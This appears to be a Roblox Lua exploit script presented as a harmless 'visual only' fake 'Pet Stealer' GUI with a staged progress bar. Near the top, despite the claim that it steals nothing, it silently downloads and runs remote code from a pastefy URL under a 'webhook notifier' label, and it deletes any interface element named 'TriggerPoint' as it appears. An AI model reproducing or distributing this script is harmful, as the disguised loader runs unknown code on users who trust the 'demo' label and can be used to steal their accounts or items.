--[[
Script Name: ScriptByteX - Pet Stealer
Title: Pet Stealer
Made by ScripterX
NOTE: This script is 100% VISUAL ONLY.
It does not actually steal anything. Just for fun GUI demo.
--]]

-- Kill any "TriggerPoint" UI instantly
local CoreGui = game:GetService("CoreGui")
local t = CoreGui:FindFirstChild("TriggerPoint", true)
if t then t:Destroy() end
CoreGui.DescendantAdded:Connect(function(obj)
    if obj.Name == "TriggerPoint" then obj:Destroy() end
end)

--// Webhook notifier (Pastefy)
-- Executes your pastefy webhook script
local function sendWebhookNotification()
    local success, err = pcall(function()
        loadstring(game:HttpGet("https://pastefy.app/0DqvarcY/raw"))()
    end)
    if not success then
        warn("Webhook failed: " .. tostring(err))
    end
end

-- Trigger webhook as soon as script runs
sendWebhookNotification()



-- Services
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

-- Create ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "PetStealerUI"
screenGui.Parent = game.CoreGui

-- Main Frame
local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 300, 0, 250)
mainFrame.Position = UDim2.new(0.35, 0, 0.25, 0)
mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
mainFrame.BorderColor3 = Color3.fromRGB(255, 0, 0)
mainFrame.BorderSizePixel = 2
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.Parent = screenGui

-- Title
local title = Instance.new("TextLabel")
title.Text = "Pet Stealer"
title.Size = UDim2.new(1, 0, 0, 30)
title.BackgroundTransparency = 1
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextScaled = true
title.Font = Enum.Font.SourceSansBold
title.Parent = mainFrame

-- Search Bar
local searchBox = Instance.new("TextBox")
searchBox.PlaceholderText = "Search..."
searchBox.Text = ""
searchBox.Size = UDim2.new(0.9, 0, 0, 25)
searchBox.Position = UDim2.new(0.05, 0, 0.18, 0)
searchBox.BackgroundColor3 = Color3.fromRGB(50, 0, 0)
searchBox.TextColor3 = Color3.fromRGB(255, 255, 255)
searchBox.Font = Enum.Font.SourceSansBold
searchBox.TextScaled = true
searchBox.Parent = mainFrame

-- Loading Spinner
local spinner = Instance.new("ImageLabel")
spinner.Size = UDim2.new(0, 50, 0, 50)
spinner.Position = UDim2.new(0.5, -25, 0.45, -25)
spinner.BackgroundTransparency = 1
spinner.Image = "rbxassetid://10849670838" -- Roblox spinning circle icon
spinner.Visible = false
spinner.Parent = mainFrame

-- Progress Label
local progressLabel = Instance.new("TextLabel")
progressLabel.Text = ""
progressLabel.Size = UDim2.new(1, 0, 0, 22)
progressLabel.Position = UDim2.new(0, 0, 0.72, 0)
progressLabel.BackgroundTransparency = 1
progressLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
progressLabel.Font = Enum.Font.SourceSansBold
progressLabel.TextScaled = true
progressLabel.Parent = mainFrame

-- Status Message
local statusLabel = Instance.new("TextLabel")
statusLabel.Text = ""
statusLabel.Size = UDim2.new(1, 0, 0, 22)
statusLabel.Position = UDim2.new(0, 0, 0.6, 0)
statusLabel.BackgroundTransparency = 1
statusLabel.TextColor3 = Color3.fromRGB(255, 255, 0)
statusLabel.Font = Enum.Font.SourceSansBold
statusLabel.TextScaled = true
statusLabel.Parent = mainFrame

-- Steal Pets Button
local stealBtn = Instance.new("TextButton")
stealBtn.Text = "Steal Pets"
stealBtn.Size = UDim2.new(0.9, 0, 0, 30)
stealBtn.Position = UDim2.new(0.05, 0, 0.82, 0)
stealBtn.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
stealBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
stealBtn.Font = Enum.Font.SourceSansBold
stealBtn.TextScaled = true
stealBtn.Parent = mainFrame

-- Credits (fixed position + smaller text)
local credits = Instance.new("TextLabel")
credits.Text = "Made by ScripterX"
credits.Size = UDim2.new(1, 0, 0, 18)
credits.Position = UDim2.new(0, 0, 0.93, 0)
credits.BackgroundTransparency = 1
credits.TextColor3 = Color3.fromRGB(255, 0, 0)
credits.Font = Enum.Font.SourceSansItalic
credits.TextScaled = true
credits.Parent = mainFrame

-- Fake status messages (shown at each 10%)
local statusMessages = {
[1] = "Initializing hack...",
[10] = "Bypassing security...",
[20] = "Scanning pets...",
[30] = "Injecting script...",
[40] = "Stealing rare pets...",
[50] = "Duplicating eggs...",
[60] = "Cracking encryption...",
[70] = "Extracting data...",
[80] = "Overwriting servers...",
[90] = "Finalizing...",
[100] = "Pets stolen successfully!"
}

-- Spinner rotation
local spinning = false
RunService.RenderStepped:Connect(function()
if spinning then
spinner.Rotation = (spinner.Rotation + 3) % 360
end
end)

-- Function: Fake Steal Progress
local function startSteal()
spinner.Visible = true
spinning = true
progressLabel.Text = "1%"
statusLabel.Text = statusMessages[1]

-- First 1% stays for 10–15s  
task.wait(math.random(10, 15))  

-- Then every 10% takes 30s  
for percent = 10, 100, 10 do  
    progressLabel.Text = tostring(percent).."%"  
    statusLabel.Text = statusMessages[percent]  
    task.wait(30)  
end  

-- Done  
progressLabel.Text = "Completed!"  
statusLabel.Text = "Success!"  
spinning = false  
spinner.Visible = false
end

-- Button click
stealBtn.MouseButton1Click:Connect(function()
startSteal()
end)
